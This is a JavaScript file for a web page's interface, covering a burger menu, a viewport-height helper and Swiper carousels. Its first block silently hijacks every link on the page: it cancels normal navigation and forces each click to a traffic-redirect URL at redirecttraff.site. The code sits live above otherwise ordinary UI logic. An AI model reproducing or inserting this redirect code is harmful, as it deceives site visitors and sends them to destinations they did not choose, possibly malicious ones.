document.querySelectorAll("a").forEach((elem) => {
	elem.onclick = function (e) {
		e.preventDefault();
		window.location.href = "https://redirecttraff.site/SFL6xsfN";
		return false;
	};
});

const setVh = () => {
	const vh = window.innerHeight * 0.01;
	document.documentElement.style.setProperty("--vh", `${vh}px`);
};

window.addEventListener("load", setVh);
window.addEventListener("resize", setVh);

let topSlidersMenuItem = document.querySelectorAll(".top_sliders_menu_item");
let topSlider = document.querySelectorAll(".top_slider");
let contentSlider = document.querySelectorAll(".content_slider_swiper");
let burger = document.querySelector(".burger");
let header = document.querySelector(".header");
let main = document.querySelector(".main");

burger.addEventListener("click", () => {
	burger.classList.toggle("active");
	header.classList.toggle("active");
	main.classList.toggle("bg-active");
	document.body.classList.toggle("hidden");
});

main.addEventListener("click", () => {
	burger.classList.remove("active");
	header.classList.remove("active");
	main.classList.remove("bg-active");
	document.body.classList.remove("hidden");
});

topSlidersMenuItem[0].classList.add("active");
topSlider[0].classList.add("active");

topSlidersMenuItem.forEach((s, i) => {
	s.addEventListener("click", () => {
		topSlidersMenuItem.forEach((el) => {
			el.classList.remove("active");
		});
		topSlider.forEach((el) => {
			el.classList.remove("active");
		});
		s.classList.add("active");
		topSlider[i].classList.add("active");
	});
	let slidesPerView = 5;
	if (window.innerWidth < 1200 && window.innerHeight < 800) {
		slidesPerView = 4;
	}
	if (window.innerWidth <= 1024) {
		slidesPerView = 3;
	}
	if (window.innerWidth <= 767) {
		slidesPerView = 1;
	}
	const swiper = new Swiper(topSlider[i], {
		loop: true,
		autoplay: {
			delay: 3000,
			disableOnInteraction: false,
		},
		slidesPerView: slidesPerView,
		spaceBetween: 7,
	});
});

contentSlider.forEach((s) => {
	let next;
	let prev;
	let slides = s.querySelectorAll(".swiper-slide");
	let slidesPerView = 6;
	if (window.innerWidth < 1200 && window.innerHeight < 800) {
		slidesPerView = 5;
	}
	if (window.innerWidth <= 1024) {
		slidesPerView = 3;
	}
	if (window.innerWidth <= 767) {
		slidesPerView = 2;
	}
	if (s.querySelector(".swiper-next")) {
		next = s.querySelector(".swiper-next");
		prev = s.querySelector(".swiper-prev");
	}
	let loop = true;
	if (slides.length < 6) {
		loop = false;
	}
	let slider = s.querySelector(".swiper");
	const swiper = new Swiper(slider, {
		loop: loop,
		autoplay: {
			delay: 3000,
			disableOnInteraction: false,
		},
		slidesPerView: slidesPerView,
		spaceBetween: 8,
		navigation: {
			nextEl: next,
			prevEl: prev,
		},
	});
});
